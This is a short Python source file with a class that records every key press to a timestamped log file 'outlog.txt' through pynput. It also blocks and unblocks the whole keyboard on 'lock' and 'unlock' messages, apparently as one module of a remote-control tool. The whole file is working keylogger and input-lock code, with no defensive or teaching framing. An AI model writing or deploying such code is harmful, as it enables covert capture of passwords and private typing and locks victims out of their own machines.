import threading, keyboard
from pynput.keyboard import Listener
import logging

class key_control:
	islock=False
	flat=True
	dem=0
	cont=""
	tmp=""
	def __init__(self):
		logging.basicConfig(filename = ("outlog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
	def keylogger(self,key):
		if(self.flat==True):
			logging.info(str(key))
			#self.tmp = str(key)
			#if (self.tmp == 'Key.space'):
			#	self.tmp = ' '
			#elif (self.tmp == '"\'"'):
			#	self.tmp = "'"
			#else:
			#	self.tmp = self.tmp.replace("'", "")
			#self.cont=self.cont+str(self.tmp)
			#with open("outlog.txt", mode='w') as f:
			#	f.write(self.cont)
		if(self.flat==False):
			return False
	def listen(self):
		with Listener(on_press = self.keylogger) as listener:
			listener.join()  
		return
	def lock(self):
		for i in range(150):
			keyboard.block_key(i)
	def un_lock(self):
		for i in range(150):
			keyboard.unblock_key(i)
	def key_logger(self,message):
		self.cont=""
		self.flat=True
		threading.Thread(target = self.listen).start()
		if(message=="lock" and self.islock==False):
			self.lock()
			self.islock=True
		if(message=="unlock" and self.islock==True):
			self.un_lock()
			self.islock=False
